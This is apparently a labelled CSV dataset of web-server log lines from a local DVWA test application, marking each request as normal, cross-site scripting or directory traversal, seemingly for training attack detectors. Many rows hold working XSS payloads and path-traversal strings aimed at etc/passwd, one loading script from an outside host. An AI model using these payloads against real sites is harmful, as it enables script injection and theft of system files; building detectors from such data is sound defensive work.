,url,normal,xss,dir
10176,"127.0.0.1 - - [03/May/2021:10:06:17 -0400] ""GET /DVWA/vulnerabilities/fi/?page=..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216..%u2216etc%u2216passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
19198,"127.0.0.1 - - [03/May/2021:03:25:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Rudolph HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10693,"127.0.0.1 - - [03/May/2021:03:14:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Doti HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5855,"127.0.0.1 - - [03/May/2021:03:24:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Raouf HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
16475,"127.0.0.1 - - [03/May/2021:03:25:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ronald HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2728,"127.0.0.1 - - [03/May/2021:02:34:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<STYLE>li {list-style-image:"" 400 0 ""-"" ""-""",0,1,0
12405,"127.0.0.1 - - [03/May/2021:03:27:08 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tess HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
810,"127.0.0.1 - - [03/May/2021:10:23:47 -0400] ""GET /DVWA/vulnerabilities/fi/?page=cvs.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18462,"127.0.0.1 - - [03/May/2021:03:15:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Faina HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18467,"127.0.0.1 - - [03/May/2021:03:41:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<wbr onmouseenter=\""alert(1)\"">test</wbr>"" 400 0 ""-"" ""-""",0,1,0
13988,"127.0.0.1 - - [03/May/2021:10:05:04 -0400] ""GET /DVWA/vulnerabilities/fi/?page= HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
13287,"127.0.0.1 - - [03/May/2021:03:22:47 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mougy HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
6095,"127.0.0.1 - - [03/May/2021:03:10:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Ailis HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20222,"127.0.0.1 - - [03/May/2021:03:27:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Terrye HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19033,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javascript:void(0)\"""" 400 0 ""-"" ""-""",0,1,0
8024,"127.0.0.1 - - [03/May/2021:03:14:56 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Eadie HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15557,"127.0.0.1 - - [03/May/2021:10:23:37 -0400] ""GET /DVWA/vulnerabilities/fi/?page=buttons.php HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14410,"127.0.0.1 - - [03/May/2021:03:21:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mable HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
982,"127.0.0.1 - - [03/May/2021:03:06:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=foro HTTP/1.1"" 200 1695 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
447,"127.0.0.1 - - [03/May/2021:03:05:39 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=classified HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
10381,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\xc3\xa2\xc2\x80\xc2\x98; alert(1);"" 400 0 ""-"" ""-""",0,1,0
175,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<isindex id=x"" 400 0 ""-"" ""-""",0,1,0
4307,"127.0.0.1 - - [03/May/2021:03:28:17 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Weringh HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
8050,"127.0.0.1 - - [03/May/2021:03:40:45 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<frameset><frame id=x"" 400 0 ""-"" ""-""",0,1,0
10366,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<template id=x"" 400 0 ""-"" ""-""",0,1,0
5059,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<template id=x"" 400 0 ""-"" ""-""",0,1,0
20136,"127.0.0.1 - - [03/May/2021:03:41:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<summary oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
17216,"127.0.0.1 - - [03/May/2021:03:40:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<img src=validimage.png"" 400 0 ""-"" ""-""",0,1,0
8498,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=xss:ex/*XSS*//*/*/pression(alert(\""XSS\""))'> HTTP/1.1"" 200 1721 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
15759,"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onmouseleave=\""alert(1)\"">test</content>"" 400 0 ""-"" ""-""",0,1,0
4982,"127.0.0.1 - - [03/May/2021:10:06:25 -0400] ""GET /DVWA/vulnerabilities/fi/?page=0x2e0x2e\\0x2e0x2e\\0x2e0x2e\\0x2e0x2e\\0x2e0x2e\\0x2e0x2e\\0x2e0x2e\\etc\\passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
15912,"127.0.0.1 - - [03/May/2021:03:41:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<math><a xlink:href=\""//jsfiddle.net/t846h/\"">click"" 400 0 ""-"" ""-""",0,1,0
20031,"127.0.0.1 - - [28/Apr/2021:21:44:08 -0400] ""GET /DVWA/dvwa/images/spanner.png HTTP/1.1"" 304 180 ""http://127.0.0.1/DVWA/setup.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
7326,"127.0.0.1 - - [03/May/2021:03:41:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><u onload=alert(1)></u>"" 400 0 ""-"" ""-""",0,1,0
7574,"127.0.0.1 - - [03/May/2021:10:06:46 -0400] ""GET /DVWA/vulnerabilities/fi/?page=../..//../..//../..//../etc/passwd HTTP/1.1"" 200 2421 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
10499,"127.0.0.1 - - [03/May/2021:03:28:04 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Vito HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3508,"127.0.0.1 - - [03/May/2021:02:30:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=%3caudio%20src%20onloadstart%3dalert(1)%3e HTTP/1.1"" 200 1679 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
5133,"127.0.0.1 - - [03/May/2021:03:40:20 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<marquee onstart=alert(1)>"" 400 0 ""-"" ""-""",0,1,0
14445,"127.0.0.1 - - [03/May/2021:03:23:29 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Odelia HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9854,"127.0.0.1 - - [03/May/2021:03:23:01 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Narendra HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
13620,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rp onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
19165,"127.0.0.1 - - [03/May/2021:03:27:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Tracy HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2617,"127.0.0.1 - - [03/May/2021:03:06:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=guest HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
2426,"127.0.0.1 - - [03/May/2021:03:26:23 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Sindee HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18756,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<th onmouseup=\""alert(1)\"">test</th>"" 400 0 ""-"" ""-""",0,1,0
20137,"127.0.0.1 - - [03/May/2021:02:35:00 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""javascript&colon;\\u0061&#x6C;&#101%72t&lpar;1&rpar;\""><button>"" 400 0 ""-"" ""-""",0,1,0
6009,"127.0.0.1 - - [03/May/2021:02:34:51 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<a href=\""\\xE2\\x80\\xA9javascript:javascript:alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
7097,"127.0.0.1 - - [03/May/2021:03:12:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Camellia HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9433,"127.0.0.1 - - [03/May/2021:03:41:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<thead id=x"" 400 0 ""-"" ""-""",0,1,0
4817,"127.0.0.1 - - [03/May/2021:03:40:22 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<area onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
19993,"127.0.0.1 - - [03/May/2021:03:41:35 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<var onblur=alert(1)"" 400 0 ""-"" ""-""",0,1,0
10593,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<legend id=x"" 400 0 ""-"" ""-""",0,1,0
6864,"127.0.0.1 - - [03/May/2021:03:22:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Mrugesh HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17881,"127.0.0.1 - - [03/May/2021:03:26:10 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Shina HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
9206,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<body/onload=&lt;!--&gt;&#10alert(1)> HTTP/1.1"" 400 0 ""-"" ""-""",0,1,0
13279,"127.0.0.1 - - [03/May/2021:03:41:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<strike onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
12500,"127.0.0.1 - - [03/May/2021:03:21:48 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Marko HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18275,"127.0.0.1 - - [03/May/2021:02:35:11 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<BASE HREF=\""javascript:alert('XSS');//\"">"" 400 0 ""-"" ""-""",0,1,0
6691,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=\""`'><script>\\x0Djavascript:alert(1)</script> HTTP/1.1"" 200 1716 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
4113,"127.0.0.1 - - [03/May/2021:03:19:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Julius HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
5767,"127.0.0.1 - - [03/May/2021:03:21:05 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lydda-June HTTP/1.1"" 200 1703 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
668,"127.0.0.1 - - [03/May/2021:03:20:58 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Lucila HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1123,"127.0.0.1 - - [03/May/2021:03:40:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<noembed onfocusout=alert(1)"" 400 0 ""-"" ""-""",0,1,0
18424,"127.0.0.1 - - [03/May/2021:03:13:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Cyb HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
14757,"127.0.0.1 - - [03/May/2021:03:41:40 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=</a>//[\""'`-->]]>]</div> HTTP/1.1"" 200 1712 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
18459,"127.0.0.1 - - [03/May/2021:03:25:43 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Selle HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12184,"127.0.0.1 - - [03/May/2021:10:06:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\.\\..\\etc\\passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
10221,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<svg><script onlypossibleinopera:-)>"" 400 0 ""-"" ""-""",0,1,0
14092,"127.0.0.1 - - [03/May/2021:03:40:53 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<link onfocus=alert(1)"" 400 0 ""-"" ""-""",0,1,0
2910,"127.0.0.1 - - [03/May/2021:03:06:46 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=joshua HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17083,"127.0.0.1 - - [03/May/2021:03:40:42 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<embed onmousemove=\""alert(1)\"">test</embed>"" 400 0 ""-"" ""-""",0,1,0
10944,"127.0.0.1 - - [03/May/2021:03:22:28 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Michie HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
17852,"127.0.0.1 - - [03/May/2021:03:11:49 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Bethena HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
1758,"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<canvas onmousedown=\""alert(1)\"">test</canvas>"" 400 0 ""-"" ""-""",0,1,0
824,"127.0.0.1 - - [03/May/2021:03:41:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<select onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
11814,"127.0.0.1 - - [03/May/2021:02:35:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=&lt;SCRIPT&gt;document&#46;write(\\\""&lt;SCRI\\\"");&lt;/SCRIPT&gt;PT SRC=\\\""http&#58;//ha&#46;ckers&#46;org/xss&#46;js\\\""&gt;&lt;/SCRIPT&gt;"" 400 0 ""-"" ""-""",0,1,0
4482,"127.0.0.1 - - [03/May/2021:03:18:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Jacky HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3884,"127.0.0.1 - - [03/May/2021:03:10:54 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Annamaria HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20470,"127.0.0.1 - - [03/May/2021:02:34:59 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<A HREF=\""http://66.102.7.147/\"">XSS</A>"" 400 0 ""-"" ""-""",0,1,0
5541,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
7860,"127.0.0.1 - - [03/May/2021:03:08:19 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=todas HTTP/1.1"" 200 1696 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
19490,"127.0.0.1 - - [03/May/2021:03:17:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Hertha HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4973,"127.0.0.1 - - [03/May/2021:03:09:57 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Adah HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18229,"127.0.0.1 - - [03/May/2021:02:35:13 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>alert(String.fromCharCode(88,83,83))</script> HTTP/1.1"" 200 1727 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=aaa"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,1,0
9276,"127.0.0.1 - - [03/May/2021:03:27:06 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Terrence HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
3864,"127.0.0.1 - - [03/May/2021:03:28:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Yue-Min HTTP/1.1"" 200 1699 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
18893,"127.0.0.1 - - [03/May/2021:10:06:41 -0400] ""GET /DVWA/vulnerabilities/fi/?page=././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../etc/passwd HTTP/1.1"" 200 1351 ""http://127.0.0.1/DVWA/vulnerabilities/fi/?page=include.php"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",0,0,1
853,"127.0.0.1 - - [03/May/2021:03:41:07 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<rp onmousemove=\""alert(1)\"">test</rp>"" 400 0 ""-"" ""-""",0,1,0
20108,"127.0.0.1 - - [03/May/2021:03:05:34 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=caroline HTTP/1.1"" 200 1700 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
15719,"127.0.0.1 - - [03/May/2021:03:40:36 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<dialog draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
9202,"127.0.0.1 - - [03/May/2021:03:05:25 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=batch HTTP/1.1"" 200 1698 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
20462,"127.0.0.1 - - [03/May/2021:03:40:38 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<div draggable=\""true\"""" 400 0 ""-"" ""-""",0,1,0
7870,"127.0.0.1 - - [03/May/2021:03:19:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Julien HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
4302,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",0,1,0
13028,"127.0.0.1 - - [03/May/2021:03:14:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=Dayle HTTP/1.1"" 200 1697 ""http://127.0.0.1/DVWA/vulnerabilities/xss_r/"" ""Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0""",1,0,0
12363,"127.0.0.1 - - [03/May/2021:03:41:03 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<output id=x"" 400 0 ""-"" ""-""",0,1,0
14230,"127.0.0.1 - - [03/May/2021:02:35:09 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script> HTTP/1.1"" 400 0 ""-"" ""-""",0,1,0
